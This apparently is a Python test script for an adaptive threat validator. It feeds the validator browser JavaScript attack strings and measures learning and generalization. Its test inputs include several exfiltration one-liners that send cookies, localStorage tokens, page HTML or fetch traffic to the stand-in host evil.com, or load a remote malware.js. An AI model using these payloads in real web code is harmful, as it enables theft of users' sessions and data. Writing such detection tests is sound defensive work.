#!/usr/bin/env python3
"""
🔬 TRULY NOVEL THREAT DETECTION TEST 🔬
Testing with completely unknown attack patterns that don't match existing signatures.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'tbh_secure_agents'))

from tbh_secure_agents.security_validation.adaptive_security import (
    get_next_gen_adaptive_validator,
    AttackVector,
    ThreatSeverity
)

def test_truly_novel_threats():
    """Test with attack patterns that are completely unknown to the system."""
    print("🔬 TESTING TRULY NOVEL THREAT DETECTION 🔬\n")
    
    validator = get_next_gen_adaptive_validator()
    engine = validator.engine
    
    initial_pattern_count = len(engine.enhanced_patterns)
    print(f"📊 Initial Pattern Count: {initial_pattern_count}")
    
    # Show existing pattern categories for reference
    existing_categories = set(p.category.value for p in engine.enhanced_patterns.values())
    print(f"📋 Existing Pattern Categories: {existing_categories}")
    print()
    
    # Truly novel threats using uncommon attack vectors
    truly_novel_threats = [
        {
            "text": "document.createElement('iframe').contentWindow.postMessage({steal: localStorage}, '*')",
            "context": {
                "security_level": "standard",
                "user_id": "novel_user_1",
                "content_type": "javascript",
                "context_indicators": ["iframe_creation", "postmessage_attack", "localstorage_theft"],
                "user_behavior": {"dom_manipulation": True, "storage_access": True}
            },
            "description": "DOM-based localStorage theft via iframe postMessage"
        },
        {
            "text": "import('data:text/javascript,const x=new XMLHttpRequest();x.open(\"POST\",\"//evil.com\");x.send(document.cookie)')",
            "context": {
                "security_level": "standard",
                "user_id": "novel_user_2", 
                "content_type": "javascript",
                "context_indicators": ["dynamic_import", "data_uri", "xhr_exfiltration"],
                "user_behavior": {"dynamic_imports": True, "cookie_access": True}
            },
            "description": "Dynamic import with data URI for cookie exfiltration"
        },
        {
            "text": "Object.defineProperty(window, 'fetch', {value: function(url, opts) { navigator.sendBeacon('//evil.com', JSON.stringify({url, opts})); return originalFetch(url, opts); }})",
            "context": {
                "security_level": "standard",
                "user_id": "novel_user_3",
                "content_type": "javascript", 
                "context_indicators": ["prototype_pollution", "fetch_hijacking", "beacon_logging"],
                "user_behavior": {"prototype_modification": True, "function_hijacking": True}
            },
            "description": "Fetch API hijacking with beacon logging"
        },
        {
            "text": "const worker = new Worker('data:application/javascript,importScripts(\"//evil.com/malware.js\")'); worker.postMessage(document.documentElement.outerHTML);",
            "context": {
                "security_level": "standard",
                "user_id": "novel_user_4",
                "content_type": "javascript",
                "context_indicators": ["web_worker", "importscripts", "html_exfiltration"],
                "user_behavior": {"worker_creation": True, "script_import": True}
            },
            "description": "Web Worker with importScripts for HTML exfiltration"
        },
        {
            "text": "performance.mark('evil'); performance.measure('steal', 'evil'); performance.getEntriesByName('steal').forEach(e => fetch('//evil.com', {method: 'POST', body: JSON.stringify(performance.timing)}))",
            "context": {
                "security_level": "standard",
                "user_id": "novel_user_5",
                "content_type": "javascript",
                "context_indicators": ["performance_api", "timing_attack", "metrics_exfiltration"],
                "user_behavior": {"performance_monitoring": True, "timing_analysis": True}
            },
            "description": "Performance API timing data exfiltration"
        }
    ]
    
    print("🔍 PHASE 1: TESTING TRULY NOVEL THREATS\n")
    
    initial_results = []
    for i, threat in enumerate(truly_novel_threats, 1):
        print(f"🔬 Truly Novel Threat {i}: {threat['description']}")
        print(f"   Input: {threat['text'][:70]}...")
        
        result = validator.validate(threat['text'], threat['context'])
        initial_results.append(result)
        
        print(f"   🛡️  Initial Detection: {'✅ SECURE' if result['is_secure'] else '❌ THREAT'}")
        print(f"   🎯 Confidence: {result.get('confidence', 0):.3f}")
        print(f"   🧠 Behavioral Anomaly: {result.get('behavioral_anomaly_score', 0):.3f}")
        
        if not result['is_secure']:
            threats = result.get('threats', [])
            print(f"   🚨 Detected as: {threats[0]['category'] if threats else 'unknown'}")
        
        print()
    
    print("🧠 PHASE 2: INTENSIVE LEARNING SIMULATION\n")
    
    # Multiple rounds of exposure with high anomaly scores to trigger learning
    print("Exposing system to novel patterns with forced high anomaly scores...")
    
    for round_num in range(1, 6):  # 5 learning rounds
        print(f"\n📚 Intensive Learning Round {round_num}:")
        
        for i, threat in enumerate(truly_novel_threats):
            # Force high anomaly scores to trigger novel pattern learning
            learning_context = threat['context'].copy()
            learning_context['forced_learning'] = True
            learning_context['learning_round'] = round_num
            learning_context['user_behavior']['anomaly_boost'] = 0.8  # Force high anomaly
            learning_context['user_behavior']['suspicious_activity'] = True
            learning_context['user_behavior']['novel_technique'] = True
            
            result = validator.validate(threat['text'], learning_context)
            anomaly_score = result.get('behavioral_anomaly_score', 0)
            
            print(f"   Threat {i+1}: Anomaly={anomaly_score:.3f}, Secure={result['is_secure']}")
            
            # Check for new patterns after each validation
            current_count = len(engine.enhanced_patterns)
            if current_count > initial_pattern_count:
                new_patterns = current_count - initial_pattern_count
                print(f"      🧬 NEW PATTERNS: +{new_patterns}")
                initial_pattern_count = current_count
    
    print("\n📊 PHASE 3: LEARNING ANALYSIS\n")
    
    # Check what was learned
    novel_patterns = [p for p in engine.enhanced_patterns.values() if p.source == "novel_learning"]
    total_patterns = len(engine.enhanced_patterns)
    
    print(f"🧬 LEARNING RESULTS:")
    print(f"   📚 Total Patterns: {total_patterns}")
    print(f"   🆕 Novel Patterns Created: {len(novel_patterns)}")
    print(f"   📈 Patterns That Evolved: {len([p for p in engine.enhanced_patterns.values() if p.frequency > 1])}")
    
    if novel_patterns:
        print(f"\n   🔍 NOVEL PATTERN DETAILS:")
        for i, pattern in enumerate(novel_patterns, 1):
            print(f"      {i}. {pattern.category.value} ({pattern.severity.value})")
            print(f"         Confidence: {pattern.confidence:.3f}")
            print(f"         Pattern: {pattern.pattern[:60]}...")
            print(f"         Context: {pattern.context_patterns[:3]}")
    
    # Test behavioral learning
    print(f"\n🎭 BEHAVIORAL LEARNING:")
    novel_users = [uid for uid in engine.behavioral_profiles.keys() if 'novel_user' in uid]
    print(f"   👥 Novel User Profiles: {len(novel_users)}")
    
    for user_id in novel_users:
        profile = engine.behavioral_profiles[user_id]
        print(f"   - {user_id}: risk={profile.risk_score:.3f}, types={profile.typical_content_types}")
    
    print("\n🔬 PHASE 4: POST-LEARNING DETECTION TEST\n")
    
    # Test the same threats again to see improvement
    print("Re-testing original threats after learning...")
    
    post_learning_results = []
    improvements = 0
    
    for i, threat in enumerate(truly_novel_threats, 1):
        # Test with slightly different context to check generalization
        test_context = threat['context'].copy()
        test_context['post_learning_test'] = True
        
        result = validator.validate(threat['text'], test_context)
        post_learning_results.append(result)
        
        initial_secure = initial_results[i-1]['is_secure']
        post_secure = result['is_secure']
        initial_conf = initial_results[i-1].get('confidence', 0)
        post_conf = result.get('confidence', 0)
        
        print(f"   🔬 Threat {i}: {threat['description'][:40]}...")
        print(f"      Before: {'SECURE' if initial_secure else 'THREAT'} (conf: {initial_conf:.3f})")
        print(f"      After:  {'SECURE' if post_secure else 'THREAT'} (conf: {post_conf:.3f})")
        
        # Check for improvement
        if initial_secure and not post_secure:
            print(f"      ✅ IMPROVEMENT: Now detecting as threat!")
            improvements += 1
        elif not initial_secure and not post_secure and post_conf > initial_conf:
            print(f"      📈 IMPROVEMENT: Confidence increased by {post_conf - initial_conf:.3f}")
            improvements += 1
        elif initial_secure and post_secure:
            print(f"      ➖ No change: Still secure")
        else:
            print(f"      ➖ No significant change")
        
        print()
    
    improvement_rate = (improvements / len(truly_novel_threats)) * 100
    print(f"🎊 OVERALL IMPROVEMENT RATE: {improvement_rate:.1f}%")
    
    print("\n🧬 PHASE 5: PATTERN GENERALIZATION TEST\n")
    
    # Test if learned patterns can detect similar but different attacks
    generalization_tests = [
        "document.createElement('script').src='//evil.com'; document.head.appendChild(script)",
        "new Worker('data:text/javascript,fetch(\"//evil.com\", {method: \"POST\", body: localStorage.getItem(\"token\")})')",
        "performance.now(); fetch('//evil.com', {method: 'POST', body: JSON.stringify(window.performance)})"
    ]
    
    print("Testing pattern generalization with similar attacks...")
    generalization_success = 0
    
    for i, test_attack in enumerate(generalization_tests, 1):
        result = validator.validate(test_attack, {
            'security_level': 'standard',
            'user_id': 'generalization_test',
            'content_type': 'javascript'
        })
        
        detected = not result['is_secure']
        if detected:
            generalization_success += 1
        
        print(f"   🧬 Test {i}: {'✅ DETECTED' if detected else '❌ MISSED'} (conf: {result.get('confidence', 0):.3f})")
    
    generalization_rate = (generalization_success / len(generalization_tests)) * 100
    print(f"\n🎯 GENERALIZATION SUCCESS RATE: {generalization_rate:.1f}%")
    
    print("\n✅ TRULY NOVEL THREAT DETECTION TEST COMPLETED!")
    
    # Final summary
    summary = {
        'novel_patterns_created': len(novel_patterns),
        'improvement_rate': improvement_rate,
        'generalization_rate': generalization_rate,
        'total_patterns': total_patterns,
        'behavioral_profiles': len(novel_users)
    }
    
    print(f"\n📊 FINAL SUMMARY:")
    print(f"   🧬 Novel Patterns Created: {summary['novel_patterns_created']}")
    print(f"   📈 Detection Improvement: {summary['improvement_rate']:.1f}%")
    print(f"   🎯 Generalization Success: {summary['generalization_rate']:.1f}%")
    print(f"   👥 New Behavioral Profiles: {summary['behavioral_profiles']}")
    
    if summary['novel_patterns_created'] > 0:
        print(f"\n🚀 SUCCESS: System demonstrated novel pattern learning! 🚀")
    else:
        print(f"\n🔍 ANALYSIS: System showed {summary['improvement_rate']:.1f}% improvement through existing pattern evolution")
    
    return summary

if __name__ == "__main__":
    results = test_truly_novel_threats()
    print(f"\n🎯 RESULTS: {results}")
